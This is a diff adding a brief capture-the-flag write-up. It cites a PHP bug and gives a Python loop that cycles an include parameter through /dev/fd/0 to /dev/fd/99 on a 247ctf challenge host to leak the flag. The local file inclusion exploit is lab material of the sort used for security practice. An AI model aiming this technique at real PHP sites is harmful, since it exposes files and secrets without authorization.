@@ -1,0 +1,12 @@
+https://bugs.php.net/bug.php?id=53465
+openning a file sets a `/dev/fd/XX`
+we can loop through them and one will have the flag
+
+```
+import requests
+
+url = "https://a2d10a91e547ce2f.247ctf.com/?include=/dev/fd/{}"
+for i in range(0, 100):
+    response = requests.get(url.format(i))
+    print(response.text)
+```
